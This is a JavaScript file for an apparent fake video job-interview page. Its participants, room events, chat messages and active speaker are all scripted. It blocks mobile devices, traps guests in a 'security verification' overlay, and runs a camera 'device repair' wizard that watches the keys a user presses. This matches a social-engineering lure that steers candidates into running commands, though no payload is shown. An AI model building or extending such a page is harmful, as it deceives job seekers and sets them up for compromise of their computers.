  els.chatBadge.textContent = unread > 9 ? "9+" : String(unread);
  els.chatBadge.classList.toggle("is-hidden", unread === 0);
  els.chatButton.classList.toggle("has-alert", unread > 0);
}

function renderEventFeed() {
  els.eventFeed.replaceChildren();

  const label = document.createElement("span");
  label.className = "event-feed__label";
  label.textContent = "Room updates";
  els.eventFeed.append(label);

  if (state.systemEvents.length === 0) {
    const empty = document.createElement("strong");
    empty.className = "event-feed__empty";
    empty.textContent = "Waiting room and device events will appear here.";
    els.eventFeed.append(empty);
    return;
  }

  state.systemEvents.slice(-4).forEach((event) => {
    const item = document.createElement("div");
    item.className = "event-feed__item";

    const time = document.createElement("span");
    time.textContent = event.time;

    const text = document.createElement("strong");
    text.textContent = event.message;

    item.append(time, text);
    els.eventFeed.append(item);
  });
}

function addSystemEvent(message) {
  const elapsed = state.startedAt ? Math.floor((Date.now() - state.startedAt) / 1000) : 0;
  state.systemEvents.push({
    time: formatTime(elapsed),
    message,
  });
  renderEventFeed();
}

function clearEventTimers() {
  state.eventTimers.forEach((timerId) => window.clearTimeout(timerId));
  state.eventTimers = [];
}

function scheduleSystemEvents() {
  const events = [
    [350, `${state.hostName} admitted ${state.currentUser.name} from the waiting room.`],
    [1200, "Candidate joined the interview room."],
    [3800, "Recording request blocked by interview policy."],
    [5600, "Interview brief synced with hiring panel."],
  ];

  events.forEach(([delay, message]) => {
    const timerId = window.setTimeout(() => addSystemEvent(message), delay);
    state.eventTimers.push(timerId);
  });
}

function rotateSpeaker() {
  if (!state.inMeeting || state.participants.length === 0) return;

  const nextIndex = (state.activeSpeakerIndex + 1) % state.participants.length;
  state.activeSpeakerIndex = nextIndex === 0 ? 1 : nextIndex;
  const speaker = state.participants[state.activeSpeakerIndex];
  els.speakerName.textContent = speaker.name;
  els.speakerInitials.textContent = getInitials(speaker.name);
  renderGallery();
}

function addChatMessage(author, message, countAsUnread = true) {
  state.messages.push([author, message]);
  renderChat();

  const chatOpen = !els.chatPanel.classList.contains("is-hidden");
  if (countAsUnread && !chatOpen) {
    state.unreadChat += 1;
    updateChatBadge();
  }
}

function openPanel(panel) {
  const showingParticipants = panel === "participants";
  const showingChat = panel === "chat";

  closeMoreMenu();
  els.interviewBriefPanel.classList.add("is-hidden");
  els.securityPanel.classList.add("is-hidden");
  els.participantsPanel.classList.toggle("is-hidden", !showingParticipants);
  els.chatPanel.classList.toggle("is-hidden", !showingChat);
  els.participantsButton.classList.toggle("is-active", showingParticipants);
  els.chatButton.classList.toggle("is-active", showingChat);
  els.securityButton.classList.remove("is-active");

  if (showingChat) {
    state.unreadChat = 0;
    updateChatBadge();
    els.chatInput.focus();
  }
}

function closePanels() {
  els.participantsPanel.classList.add("is-hidden");
  els.chatPanel.classList.add("is-hidden");
  els.securityPanel.classList.add("is-hidden");
  closeMoreMenu();
  if (state.inMeeting && state.briefVisible) {
    els.interviewBriefPanel.classList.remove("is-hidden");
  }
  els.participantsButton.classList.remove("is-active");
  els.chatButton.classList.remove("is-active");
  els.securityButton.classList.toggle("is-active", state.securityVerified);
}

function toggleBriefPanel(forceState) {
  state.briefVisible = typeof forceState === "boolean" ? forceState : !state.briefVisible;
  const anySidePanelOpen =
    !els.participantsPanel.classList.contains("is-hidden") ||
    !els.chatPanel.classList.contains("is-hidden") ||
    !els.securityPanel.classList.contains("is-hidden");

  els.interviewBriefPanel.classList.toggle("is-hidden", !state.briefVisible || anySidePanelOpen);
  els.briefButton.classList.toggle("is-active", state.briefVisible);
  els.briefButton.textContent = state.briefVisible ? "Hide Brief" : "Show Brief";
}

function showToast(message) {
  els.toast.textContent = message;
  els.toast.classList.add("is-visible");
  window.clearTimeout(showToast.timeoutId);
  showToast.timeoutId = window.setTimeout(() => {
    els.toast.classList.remove("is-visible");
  }, 1800);
}

function launchReaction() {
  const reaction = document.createElement("div");
  reaction.className = "reaction";
  reaction.textContent = "Applause";
  reaction.style.right = `${14 + Math.random() * 48}vw`;
  els.reactionLayer.append(reaction);
  showToast(`${state.currentUser.name} reacted with applause`);

  window.setTimeout(() => {
    reaction.remove();
  }, 1900);
}

function closeMoreMenu() {
  els.moreMenu.classList.add("is-hidden");
  els.moreButton.classList.remove("is-active");
  els.moreButton.setAttribute("aria-expanded", "false");
}

function toggleMoreMenu() {
  const isOpen = !els.moreMenu.classList.contains("is-hidden");
  els.moreMenu.classList.toggle("is-hidden", isOpen);
  els.moreButton.classList.toggle("is-active", !isOpen);
  els.moreButton.setAttribute("aria-expanded", String(!isOpen));
}

function isInside(target, ...elements) {
  return elements.some((element) => element.contains(target));
}

function handleMoreAction(action) {
  closeMoreMenu();

  const messages = {
    connection: `Connection stable · Meeting ID ${state.roomCode}`,
    policy: "Interview policy: recording disabled, confidential strategy details not required.",
    help: "Opening device setup for camera troubleshooting.",
  };

  showToast(messages[action] || "Option unavailable");
  if (action === "policy") {
    addSystemEvent("Interview policy opened by candidate.");
  }
  if (action === "help") {
    showDeviceRepairDialog();
  }
}

function toggleShare(forceState) {
  const nextSharingState = typeof forceState === "boolean" ? forceState : !state.isSharing;
  const changed = nextSharingState !== state.isSharing;
  state.isSharing = nextSharingState;
  els.shareBanner.classList.toggle("is-hidden", !state.isSharing);
  els.shareButton.classList.toggle("is-active", state.isSharing);
  els.shareBannerText.textContent = `${state.currentUser.name} is sharing their screen`;
  if (changed) {
    showToast(state.isSharing ? "Screen share started" : "Screen share stopped");
  }
}

function leaveMeeting() {
  state.inMeeting = false;
  clearInterval(state.timerId);
  clearEventTimers();
  closeMoreMenu();
  closePanels();
  toggleShare(false);
  resetDeviceRepairState();
  hidePostJoinSecurity();
  unlockMeetingViewport();
  els.meeting.classList.add("is-hidden");
  if (state.role === "host" && !state.invitedViaLink) {
    showHome();
  } else {
    showPrejoin();
  }
  showToast("You left the interview room");
}

function startJoinFlow() {
  if (state.isJoining) return;

  state.isJoining = true;
  updateJoinAvailability();

  const steps =
    state.role === "guest"
      ? [
          "Validating invitation link...",
          "Placing candidate in waiting room...",
          `Notifying ${state.hostName} and hiring panel...`,
          "Checking audio route and device permissions...",
          "Starting your video...",
          "Admitting candidate to interview room...",
        ]
      : [
          "Starting secure interview room...",
          "Loading interview brief...",
          "Preparing hiring panel workspace...",
          "Opening interview room...",
        ];

  let stepIndex = 0;
  showProcessOverlay(steps[stepIndex], `${state.topic} · ${state.roomCode}`);

  const stepTimer = window.setInterval(() => {
    stepIndex += 1;
    if (stepIndex >= steps.length) {
      window.clearInterval(stepTimer);
      hydrateMeeting();
      hideLaunchOverlay();
      els.home.classList.add("is-hidden");
      els.prejoin.classList.add("is-hidden");
      els.meeting.classList.remove("is-hidden");
      els.joinButton.textContent = "Join interview";
      state.isJoining = false;
      updateJoinAvailability();
      showPostJoinSecurity();
      showToast(state.role === "guest" ? "Admitted to the interview room" : "Interview room started");
      return;
    }

    showProcessOverlay(steps[stepIndex], `${state.topic} · ${state.roomCode}`);
  }, 850);
}

async function copyText(value, successMessage) {
  try {
    await navigator.clipboard.writeText(value);
    showToast(successMessage);
  } catch {
    const temporaryInput = document.createElement("input");
    temporaryInput.value = value;
    document.body.append(temporaryInput);
    temporaryInput.select();
    document.execCommand("copy");
    temporaryInput.remove();
    showToast("Link selected for copying");
  }
}

els.createForm.addEventListener("submit", (event) => {
  event.preventDefault();
  if (!requireHostAccess("create a meeting")) return;

  state.role = "host";
  state.invitedViaLink = false;
  state.hostName = els.hostName.value.trim() || DEFAULT_HOST_NAME;
  state.hostRole = normalizeHostRole(els.createHostRole.value);
  state.currentUser.name = state.hostName;
  state.topic = els.createTopic.value.trim() || DEFAULT_TOPIC;
  state.duration = normalizeDuration(els.createDuration.value);
  state.roomCode = generateRoomCode();
  state.passcode = createPasscode();
  els.displayName.value = state.currentUser.name;
  els.meetingTopic.value = state.topic;
  els.homeDurationStat.textContent = state.duration;
  document.title = `${state.topic} - Video Meeting`;
  updateCreatedRoom();
  updateInviteContext();
  els.createdRoom.dataset.hasMeeting = "1";
  els.createdRoom.classList.remove("is-hidden");
  showToast("Meeting created. Invitation link is ready.");
});

els.hostAccessUnlock?.addEventListener("click", () => {
  els.hostAccessError?.classList.add("is-hidden");

  if (unlockHostAccess(els.hostAccessCode?.value)) {
    els.hostAccessCode.value = "";
    updateHostAccessUI();
    showToast("Host console unlocked for this browser session.");
    return;
  }

  els.hostAccessError?.classList.remove("is-hidden");
  els.hostAccessCode?.focus();
  els.hostAccessCode?.select();
});

els.hostAccessCode?.addEventListener("keydown", (event) => {
  if (event.key === "Enter") {
    event.preventDefault();
    els.hostAccessUnlock?.click();
  }
});

els.copyCreatedLink.addEventListener("click", () => {
  copyText(els.createdLink.value, "Invitation link copied");
});

els.startHostButton.addEventListener("click", () => {
  if (!requireHostAccess("start a meeting")) return;

  state.role = "host";
  showPrejoin();
  showToast("Host room prepared");
});

els.createDuration.addEventListener("change", () => {
  state.duration = normalizeDuration(els.createDuration.value);
  els.createDuration.value = state.duration;
  els.homeDurationStat.textContent = state.duration;
  updateCreatedRoom();
  updateInviteContext();
});

els.hostName.addEventListener("input", () => {
  state.hostName = els.hostName.value.trim() || DEFAULT_HOST_NAME;
  updateCreatedRoom();
  updateInviteContext();
});

els.createHostRole.addEventListener("input", () => {
  state.hostRole = normalizeHostRole(els.createHostRole.value);
  updateCreatedRoom();
  updateInviteContext();
});

els.createTopic.addEventListener("input", () => {
  state.topic = els.createTopic.value.trim() || DEFAULT_TOPIC;
  document.title = `${state.topic} - Video Meeting`;
  updateCreatedRoom();
  updateInviteContext();
});

els.displayName.addEventListener("input", () => {
  updatePreview();
  validateDisplayName();
  updateJoinAvailability();
});

els.deviceRepairNext?.addEventListener("click", (event) => {
  if (state.device.repairWizardStep === 3 && event.detail === 0) {
    showRepairWrongKeyWarning("enter");
    return;
  }

  confirmRepairWizardStep();
});

els.deviceRepairCheck.addEventListener("click", () => {
  checkCameraInRepairDialog();
});

els.deviceRepairRestart.addEventListener("click", () => {
  state.device.cameraRepairAttempted = false;
  resetRepairWizard();
});

els.deviceRepairContinue.addEventListener("click", () => {
  continueAfterDeviceRepair();
});

els.deviceRepairFallbackTrigger?.addEventListener("click", () => {
  clearStep1FallbackTimer();
  els.deviceRepairFallback?.classList.remove("is-hidden");
  els.deviceRepairFallbackPanel?.classList.remove("is-hidden");
});

els.openDeviceRepair.addEventListener("click", () => {
  showDeviceRepairDialog();
});

els.meetingTopic.addEventListener("input", () => {
  state.topic = els.meetingTopic.value.trim() || DEFAULT_TOPIC;
  document.title = `${state.topic} - Video Meeting`;
  updateInviteContext();
  updateCreatedRoom();
});

els.prejoinMic.addEventListener("click", () => {
  const active = !els.prejoinMic.classList.contains("is-active");
  setButtonState(els.prejoinMic, active, "Mic on", "Mic off");
  els.previewAudioState.textContent = active ? "Microphone ready" : "Mic muted";
});

els.prejoinCamera.addEventListener("click", () => {
  if (!state.device.cameraRecognized) {
    setButtonState(els.prejoinCamera, false, "Camera on", "Camera off");
    showToast("Video will be available after device setup in the interview room.");
    return;
  }

  const active = !els.prejoinCamera.classList.contains("is-active");
  setButtonState(els.prejoinCamera, active, "Camera on", "Camera off");
});

els.form.addEventListener("submit", (event) => {
  event.preventDefault();
  if (isMobileJoinBlocked()) {
    updateJoinAvailability();
    showToast("Please join from a Windows, macOS, or Linux desktop/laptop.");
    return;
  }
  if (!validateDisplayName({ reveal: true })) {
    updateJoinAvailability();
    els.displayName.focus();
    showToast("Enter your full name before joining.");
    return;
  }
  startJoinFlow();
});

els.launchContinue.addEventListener("click", hideLaunchOverlay);

els.securityStartButton.addEventListener("click", runCloudVerification);

els.micButton.addEventListener("click", () => {
  state.currentUser.muted = !state.currentUser.muted;
  els.micButton.classList.toggle("is-active", !state.currentUser.muted);
  els.micButton.querySelector("small").textContent = state.currentUser.muted ? "Unmute" : "Mute";
  renderGallery();
  renderParticipants();
  showToast(state.currentUser.muted ? "Microphone muted" : "Microphone unmuted");
});

els.cameraButton.addEventListener("click", () => {
  if (!state.currentUser.video) {
    showDeviceRepairDialog();
    showToast("Open device setup to restore your camera.");
    return;
  }

  state.currentUser.video = false;
  els.cameraButton.classList.toggle("is-active", false);
  els.cameraButton.querySelector("small").textContent = "Start";
  renderGallery();
  renderParticipants();
  showToast("Video stopped");
});

els.participantsButton.addEventListener("click", () => {
  const isOpen = !els.participantsPanel.classList.contains("is-hidden");
  isOpen ? closePanels() : openPanel("participants");
});

els.chatButton.addEventListener("click", () => {
  const isOpen = !els.chatPanel.classList.contains("is-hidden");
  isOpen ? closePanels() : openPanel("chat");
});

els.securityButton.addEventListener("click", () => {
  if (state.securityVerified) {
    openSecurityDetails();
    return;
  }

  showPostJoinSecurity();
  showToast("Security verification opened");
});

els.briefButton.addEventListener("click", () => {
  closePanels();
  toggleBriefPanel();
});

els.briefToggleButton.addEventListener("click", () => {
  toggleBriefPanel(false);
});

document.querySelectorAll("[data-close-panel]").forEach((button) => {
  button.addEventListener("click", closePanels);
});

els.chatForm.addEventListener("submit", (event) => {
  event.preventDefault();
  const message = els.chatInput.value.trim();
  if (!message) return;

  addChatMessage(state.currentUser.name, message, false);
  els.chatInput.value = "";
});

els.shareButton.addEventListener("click", () => toggleShare());
els.stopShareButton.addEventListener("click", () => toggleShare(false));
els.reactionButton.addEventListener("click", launchReaction);
els.recordButton.addEventListener("click", () => {
  els.recordButton.classList.add("has-alert");
  showToast("Recording is blocked by interview policy");
  addSystemEvent("Recording request blocked by interview policy.");
  window.setTimeout(() => els.recordButton.classList.remove("has-alert"), 1600);
});
els.moreButton.addEventListener("click", toggleMoreMenu);
els.moreMenu.addEventListener("click", (event) => {
  const action = event.target.dataset.moreAction;
  if (action) {
    handleMoreAction(action);
  }
});
document.addEventListener("click", (event) => {
  const target = event.target;

  if (
    !els.moreMenu.classList.contains("is-hidden") &&
    !isInside(target, els.moreMenu, els.moreButton)
  ) {
    closeMoreMenu();
  }

  const panelOpen =
    !els.participantsPanel.classList.contains("is-hidden") ||
    !els.chatPanel.classList.contains("is-hidden") ||
    !els.securityPanel.classList.contains("is-hidden");
  if (
    state.inMeeting &&
    panelOpen &&
    !isInside(
      target,
      els.participantsPanel,
      els.chatPanel,
      els.securityPanel,
      els.participantsButton,
      els.chatButton,
      els.securityButton,
    )
  ) {
    closePanels();
  }
});

document.addEventListener("keydown", (event) => {
  if (event.key !== "Escape") return;

  closeMoreMenu();
  if (!els.deviceRepairDialog.classList.contains("is-hidden")) {
    return;
  }
  if (!els.postJoinSecurity.classList.contains("is-hidden")) {
    if (state.role === "guest" && !state.securityVerified) {
      return;
    }
    hidePostJoinSecurity();
    return;
  }
  closePanels();
});

document.addEventListener("keydown", handleRepairWizardKeydownGuard, true);

els.leaveButton.addEventListener("click", leaveMeeting);

els.inviteButton.addEventListener("click", () => {
  updateInviteLink();
  if (typeof els.inviteDialog.showModal === "function") {
    els.inviteDialog.showModal();
  } else {
    els.inviteDialog.setAttribute("open", "");
  }
});

els.copyLinkButton.addEventListener("click", async () => {
  els.inviteLink.select();

  try {
    await navigator.clipboard.writeText(els.inviteLink.value);
    showToast("Invite link copied");
  } catch {
    document.execCommand("copy");
    showToast("Invite link selected");
  }
});

els.viewButton.addEventListener("click", () => {
  const compact = els.gallery.classList.toggle("is-compact");
  els.viewButton.textContent = compact ? "Speaker View" : "Gallery View";
  showToast(compact ? "Compact gallery view" : "Gallery view");
});

window.setInterval(() => {
  rotateSpeaker();
}, 3500);

window.setInterval(() => {
  if (!state.inMeeting || state.messages.length > 12) return;
  const autoMessagesForHost = getAutoMessages();
  const [author, message] =
    autoMessagesForHost[Math.floor(Math.random() * autoMessagesForHost.length)];
  addChatMessage(author, message);
}, 14000);

applyQueryDefaults();

window.addEventListener("resize", () => {
  syncBriefPanelForViewport();
});
